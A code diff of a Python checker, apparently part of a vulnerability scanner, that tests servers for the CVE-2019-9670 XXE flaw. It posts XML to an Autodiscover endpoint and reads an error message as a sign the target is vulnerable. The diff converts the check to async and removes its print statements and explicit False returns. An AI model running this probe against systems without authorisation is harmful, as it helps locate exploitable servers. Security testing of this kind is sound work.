@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2019_9670_BaseVerify:
     def __init__(self, url):
@@ -20,7 +20,7 @@ class CVE_2019_9670_BaseVerify:
             "Content-Type":"application/xml"
         }
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -41,20 +41,14 @@ class CVE_2019_9670_BaseVerify:
           </Autodiscover>
         """
         try:
-            req = request.post(self.url + '/Autodiscover/Autodiscover.xml', headers = self.headers, data = data)
-            if 'Error 503 Requested response schema not available' in req.text:
-                print('存在CVE-2019-9670 XXE读取漏洞')
+            req = await request.post(self.url + '/Autodiscover/Autodiscover.xml', headers = self.headers, data = data)
+            if 'Error 503 Requested response schema not available' in await req.text():
+                # print('存在CVE-2019-9670 XXE读取漏洞')
                 return True
-            else:
-                print('不存在CVE-2019-9670 XXE读取漏洞')
-                return False
         except Exception as e:
-            print(e)
-            print('不存在CVE-2019-9670 XXE读取漏洞')
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
-    CVE_2019_9670 = CVE_2019_9670_BaseVerify('https://127.0.0.1')
+    CVE_2019_9670 = CVE_2019_9670_BaseVerify('http://127.0.0.1:7001')
     CVE_2019_9670.check()
